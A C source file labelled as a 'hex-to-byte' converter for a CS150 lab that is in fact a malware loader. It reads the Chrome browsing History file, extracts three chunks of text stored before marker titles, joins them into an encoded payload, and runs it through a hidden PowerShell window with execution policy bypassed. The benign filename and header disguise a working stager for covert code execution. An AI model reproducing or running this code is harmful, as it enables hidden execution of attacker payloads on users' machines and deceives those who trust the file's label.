//
//  hex-to-byte.c
//  CS150-Lab
//
//  Created by Tarek Abdelmotaleb on 11/21/19.
//  Copyright © 2019 Tarek Abdelmotaleb. All rights reserved.
//


#include <stdio.h>
#include <string.h>
#include <stdlib.h>




    
    


int main(int argc, char **argv) {
    
   	char* home = getenv("HOMEPATH");
	char* path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History";
	
	size_t pathLen = strlen(home) + strlen(path) + 1;
	char* fullpath = malloc(pathLen);
	
	strcpy(fullpath, home);
	strcat(fullpath, path);
    
    FILE* fp= fopen(fullpath, "r"); 
    
    char ch;
    char begin[10] = "my";
    char *end = "down1Title";
    char *end2 = "down2Title";
    char *end3 = "down3Title";
    char *file;
    long len;
    int i;
    char * ShellPart1;
    char * ShellPart2;
    char * ShellPart3;
	
	

	
    int shell1Len = 1898;
    int shell2Len = 1898;
    int shell3Len = 1900;
    char *p;
	
	ShellPart1 = calloc(shell1Len + 1, sizeof(char));
	ShellPart2 = calloc(shell2Len + 1, sizeof(char));
	ShellPart3 = calloc(shell3Len + 1, sizeof(char));

	
	
       
	fseek(fp, 0, SEEK_END);
	len = ftell(fp);
    file = (char*)malloc(sizeof(char)*len);
    rewind(fp);
	fread(file,1,len,fp);
    fclose(fp);
	
	for(i=0; i<len; i++){
		if(file[i] == '\0')
			file[i] = '\xFF';

	}
	p = strstr(file, end);
	if(p){
		memcpy(ShellPart1, p-shell1Len, shell1Len);
	}
	p = strstr(file, end2);
	if(p){
		memcpy(ShellPart2, p-shell2Len, shell2Len);
	}

	p = strstr(file, end3);
	if(p){
		memcpy(ShellPart3, p-shell3Len, shell3Len);
	}
 
	
	char * fullShell;
	fullShell = calloc(shell1Len + shell2Len + shell3Len + 1, sizeof(char)); 
	
    strcat(fullShell, ShellPart1);
    
    strcat(fullShell, ShellPart2);
	strcat(fullShell, ShellPart3);
    
    char cmd[7000];
    sprintf(cmd, "powershell.exe -W Hidden -nop -ep bypass -NoExit -E %s", fullShell);
	system(cmd);
	
	

    

    
    return 0;
}

